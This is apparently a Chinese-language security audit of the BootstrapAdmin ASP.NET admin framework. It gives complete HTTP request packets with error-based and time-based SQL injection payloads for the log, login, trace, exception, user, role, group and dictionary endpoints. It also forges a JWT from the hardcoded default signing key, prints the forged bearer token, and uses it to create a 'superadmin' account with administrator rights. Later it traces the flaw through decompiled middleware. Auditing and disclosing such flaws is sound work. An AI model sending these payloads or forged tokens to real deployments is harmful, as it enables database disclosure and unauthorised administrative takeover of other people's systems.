![image.png](../../images/posts/ae16c35af1af63eb834fc9629bb96b5e.png)
请求包：
```python
GET /api/Logs?OperateTimeEnd=&OperateTimeStart=2023-05-06&limit=1&offset=0&operateType=&order=sleep(10))&sort=if(1=2,1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close


```
更多利用方式请看：[https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/](https://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E4%B9%8Border-by%E6%B3%A8%E5%85%A5/)
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Log.cs`
在SQL语句拼接时`Sort`和`Order`没有使用 Linq 进行转义
![image.png](../../images/posts/62dd5cd7c78be6a68e56d638070fae73.png)
## 【后台】查询所有SQL日志信息接口存在SQL注入
权限：后台普通用户权限
### 漏洞利用
`http://localhost:50852/api/SQL`
`http://localhost:50852/api/SQL?offset=0&limit=20&UserName=&OperateTimeStart=2023-05-06&OperateTimeEnd=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`
![image.png](../../images/posts/24863a36b5e9de3202a54f6b02f2de44.png)
请求包：
```python
GET /api/SQL?offset=0&limit=20&UserName=&OperateTimeStart=2023-05-06&OperateTimeEnd=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/SQL
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close


```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\DBLog.cs`
在SQL语句拼接时`Sort`和`Order`没有使用 Linq 进行转义
![image.png](../../images/posts/127b5816031575d08d07627813759e5d.png)
## 【后台】获得登录用户的分页数据接口存在SQL注入
权限：后台普通用户权限
### 漏洞利用
`http://localhost:50852/api/Login`
`http://localhost:50852/api/Login?&offset=0&limit=20&startTime=2023-05-06&endTime=&loginIp=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`
![image.png](../../images/posts/061da962ab0271b35ee9562f66c26e84.png)
请求包：
```python
GET /api/Login?&offset=0&limit=20&startTime=2023-05-06&endTime=&loginIp=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Logins
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close


```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\LoginUser.cs`
![image.png](../../images/posts/be44f4a2270af6c182e59ae13af31845.png)
## 【后台】查询用户访问分页数据接口存在SQL注入
权限：后台普通用户权限
### 漏洞利用
`http://localhost:50852/api/Traces`
`http://localhost:50852/api/Traces?offset=0&limit=20&OperateTimeStart=2023-05-06&OperateTimeEnd=&AccessIP=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`
![image.png](../../images/posts/847f00d43d222f8b1a5d34ed277ac9f6.png)
请求包：
```python
GET /api/Traces?offset=0&limit=20&OperateTimeStart=2023-05-06&OperateTimeEnd=&AccessIP=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Traces
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close


```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Trace.cs`
![image.png](../../images/posts/81a75b392674e41d44c192aed653bde6.png)
## 【后台】查询程序异常接口存在SQL注入
权限：后台普通用户权限
### 漏洞利用
`http://localhost:50852/api/Exceptions`
`http://localhost:50852/api/Exceptions?&offset=0&limit=20&StartTime=&EndTime=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1,`
![image.png](../../images/posts/4cf630f90aef7e3d98b1dd677c4f6715.png)
请求包：
```python
GET /api/Exceptions?&offset=0&limit=20&StartTime=&EndTime=&order=concat(0x7e,database(),0x7e),3)&sort=updatexml(1, HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Exceptions
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close


```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Exceptions.cs`
![image.png](../../images/posts/b33eb6a1127f0f9c112127f87e4f609c.png)
## 【后台】删除用户接口存在SQL注入
权限：后台管理员用户权限
### 漏洞利用
`http://localhost:50852/api/Users`
![image.png](../../images/posts/8bd0cf87715398a7cf0ba16e8a0317c9.png)
请求包：
```python
DELETE /api/Users HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\User.cs`
![image.png](../../images/posts/7352306b31d4773433705f0262964b64.png)
## 【后台】删除角色表接口存在SQL注入
权限：后台管理员用户权限
### 漏洞利用
`http://localhost:50852/api/Roles`
![image.png](../../images/posts/48b6d7a4bebe2abb559125b4eab817ce.png)
请求包：
```python
DELETE /api/Roles HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Roles
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Role.cs`
![image.png](../../images/posts/548a115dee49b7b3bc5947430b8dada0.png)
## 【后台】删除群组信息存在SQL注入
权限：后台管理员用户权限
### 漏洞利用
`http://localhost:50852/api/Groups`
![image.png](../../images/posts/01d2a5098a0eefcd05d7563297f3112a.png)
请求包：
```python
DELETE /api/Groups HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Groups
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Group.cs`
![image.png](../../images/posts/60bb9e1527c8ee018cae3e134e45fa77.png)
## 【后台】删除字典中的数据存在SQL注入
权限：后台管理员用户权限
### 漏洞利用
`http://localhost:50852/api/Dicts`
![image.png](../../images/posts/4523927e70541fb7c0e52ce7c2005962.png)
请求包：
```python
DELETE /api/Dicts HTTP/1.1
Host: localhost:50852
Content-Length: 47
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Dicts
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: .AspNetCore.Antiforgery.a2HlFfgw_P8=CfDJ8Gs8oXs1rxRKjEnWjDIDxNYIk8qTrVAchQMdNQDsqE0fBboelKrRDrSlcNGeSNFI1jNSivWc5b5t8tkI1SES8xumGS6HdMyCcTFdEqocP7y74P26iG_iKW6RRYrazzhQNkcvDfYzcxAzdbm-f5FqO88; .AspNetCore.Cookies=CfDJ8Gs8oXs1rxRKjEnWjDIDxNaE3CXKRjutQdTU9MI2xO1nRk7yd-9PgK41JPtnvxNoybJwZclKPosGkyWisjmmpaB2xJkLw04jWnB1ZpvrHYBNhbm02wR62IXpOdYVnmBRgSs7UrKRDnk-fAR9CRWNiYrLr5Dq9irg-R7uxSbuwu1A-eKvcQUsLvd_nvlRmExl_ay-3wo0v1rvUe1pwpbhyzzda5HLQbh0XOMmor5h0q66o9vFYO5dgBUGqYxpBidWCv0PoKzqGQeA_8dxsBolEctWPrQEKakod3mJ1HrIKQR1
Connection: close

["updatexml(1,concat(0x7e,database(),0x7e),3)"]
```
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.DataAccess\Dict.cs`
![image.png](../../images/posts/500103945c347afe15d888827cba57e2.png)
## 【前台】任意JWT伪造
### 漏洞利用
目前版本是不允许我们未授权访问该接口的（在旧版本是可以的），该接口用来查询当前用户情况。
`http://localhost:50852/api/Users?search=&sort=RegisterTime&order=desc&offset=0&limit=20&name=&displayName=&_=1683423761467`
![image.png](../../images/posts/a63069bc8fa35d42b1d6c7409425a1e1.png)
默认的 SecurityKey 为 `BootstrapAdmin-V1.1`
我们可以到`https://jwt.io/`伪造Cookie，填入SecurityKey并修改Data里面的 exp（过期时间）即可。
![image.png](../../images/posts/4a2c931672fc15c7ffd2eac3d8bd24ae.png)
```python
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
```
请求时携带这个请求头再次访问即可获取用户信息，此时我们没有登录任何账户。
![image.png](../../images/posts/a03fbd933ceeddf6c0b266471ab75f23.png)
请求包：
```python
GET /api/Users?search=&sort=RegisterTime&order=desc&offset=0&limit=20&name=&displayName=&_=1683423761467 HTTP/1.1
Host: localhost:50852
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
Connection: close


```
使用同样的手法，创建用户
![image.png](../../images/posts/10c3d3fcfdd413cba10ebd60ce96f24c.png)
请求包：
```python
POST /api/Users HTTP/1.1
Host: localhost:50852
Content-Length: 103
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: 
Connection: close

{"Id":"","UserName":"superadmin","Password":"123456","DisplayName":"superadmin","NewPassword":"123456"}
```
再次请求就可以看到账户创建成功了。
![image.png](../../images/posts/c57037cdfee20fb69a35d457220d219b.png)
然后给这个账户增加管理员权限，同样使用JWT验证。
![image.png](../../images/posts/b3b4e34f2cd40fb059d4b4c807a77239.png)
请求包：
```python
PUT /api/Users/9?type=role HTTP/1.1
Host: localhost:50852
Content-Length: 5
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:50852
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:50852/Admin/Users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IkFkbWluIiwibmJmIjoxNjgzMzgzNTA1LCJleHAiOjE2OTMzODM1MDUsImlhdCI6MTY4MzM4MzUwNSwiaXNzIjoiQkEiLCJhdWQiOiJhcGkifQ.DvpSS-mW4nmKaTf-NFMQHgWO2XhAP5SFX-7Ec2uV3nQ
Cookie: 
Connection: close

["1"]
```
这个时候我们使用账号`superadmin/123456`登录就是管理员用户了。
![image.png](../../images/posts/e4c7e8cc66f88571872b8368620df26d.png)
### 漏洞定位
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Startup.cs`
在这个文件里添加了一个`UseBootstrapAdminAuthentication`的中间件，我们所有的请求会先进入到该中间件。
![image.png](../../images/posts/98a89d0c1591e9bd2f5444c26a9f91cb.png)
反编译`bootstrap.security.mvc\6.0.0\lib\net5.0\Bootstrap.Security.Mvc.dll`
跟进`AuthenticationExtensions`类，可以看到`UseBootstrapAdminAuthentication`方法
![image.png](../../images/posts/3422ef6b59d9d8e1a15c27498536ff40.png)
> 首先`builder.UseAuthentication();`启用身份验证中间件。在 ASP.NET Core 应用程序中，身份验证中间件处理身份验证和票据。它负责验证请求中的凭据并设置当前用户的身份。启用身份验证后，可以使用 HttpContext.User 属性访问当前用户的身份信息。通常会在 Configure 方法中调用 UseAuthentication()，以确保在请求管道中使用身份验证中间件。
> 其次`builder.Use`和`builder.UseWhen`都是 ASP.NET Core 应用程序中用于修改请求管道的方法，但是它们的使用场景有所不同。
> builder.Use 用于向请求管道中添加中间件。它可以将多个中间件串连在一起，按照添加的顺序一个接一个地处理请求，从而实现请求处理流程的定制。例如，在调用控制器方法之前可以添加一个身份验证中间件，以确保只有已经通过身份验证的用户才能访问受保护的资源。builder.Use 返回一个 IApplicationBuilder 实例，因此可以在一个 Configure 方法中多次调用 builder.Use，以添加所需的中间件。
> builder.UseWhen 则用于根据一定的条件向请求管道中添加中间件。它接受一个布尔表达式作为参数，只有当表达式的结果为 true 时才会添加中间件。这个功能在某些场景下很有用，例如，可以根据请求的路径来决定是否启用某个特定的中间件。builder.UseWhen 返回一个 IApplicationBuilder 实例，也可以嵌套在另一个 builder.UseWhen 中，以实现复杂的条件分支逻辑。

我们先查看特殊情况，也就是`builder.UseWhen`。这里的条件是请求路径中包含`/api`时会应用下面的中间件。
```python
app.Use(async delegate (HttpContext context, Func<Task> next)
{
    IIdentity? identity = context.User.Identity;
    if (identity != null && !identity!.IsAuthenticated)
    {
        JwtAuthentication(context);
    }

    if ((context.User.Identity?.IsAuthenticated ?? false) && !string.IsNullOrEmpty(context.User.Identity!.Name))
    {
        AddRoles(context.User, RetrieveRolesByUserName(context.User.Identity!.Name), new ClaimsIdentity("Bearer"));
    }

    await next();
});
```
当`identity`不存在时，即 Cookie 中的`.AspNetCore.Cookies`不存在时使用`JwtAuthentication`，我们继续跟进该方法。
`JwtAuthentication`在`AuthenticationExtensions`类。观察`ValidateToken`，这是JWT的验证方法，校验了三个参数，分别是签名密钥以及令牌的颁发者 Issuer 和 Audience。如果验证成功，则返回`ClaimsPrincipal`对象表示令牌中包含的声明。
![image.png](../../images/posts/f4c80cf9ba8be6cf7c6c4c6fc9ddb524.png)
需要校验的内容都在：
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\appsettings.json`
![image.png](../../images/posts/4f2cb4198e37b425575c790e2aa3d67a.png)
```python
  "TokenValidateOption": {
    "Issuer": "BA",
    "Audience": "api",
    "Expires": 5,
    "SecurityKey": "BootstrapAdmin-V1.1"
  }
```
我们得到了这些参数就可以进行JWT伪造了。
那么我们经过了`JwtAuthentication`此时`context.User`已经是`claimsPrincipal`对象了。第二个判断判断了用户是否已经认证（authenticated）以及用户的身份是否存在（name是否为空）。然后进入到`AddRoles`方法中去。
![image.png](../../images/posts/aff73331de6304d2338fed481429f0cf.png)
> ClaimsPrincipal 对象是 ASP.NET Core Identity 框架中用于表示用户上下文认证信息的对象。它包含了一个或多个 Claim，每个 Claim 包含了一些有关用户身份、角色或标识的信息。

这里添加了`role`以便后续的身份校验。其中的`roles`的值为
`RetrieveRolesByUserName(context.User.Identity!.Name)`
通过用户名查询对于的角色列表，然后通过遍历添加`Claim`。
那么什么时候会用到`role`呢？我们接着往下看。
`BootstrapAdmin\src\mvc\admin\Bootstrap.Admin\Startup.cs`
在这个文件里给 Controllers 添加了BootstrapAdmin 后台权限认证过滤器
![image.png](../../images/posts/e1e50ab7f1fe88daa2e5e3464754a72d.png)
反编译`bootstrap.security.mvc\6.0.0\lib\net5.0\Bootstrap.Security.Mvc.dll`
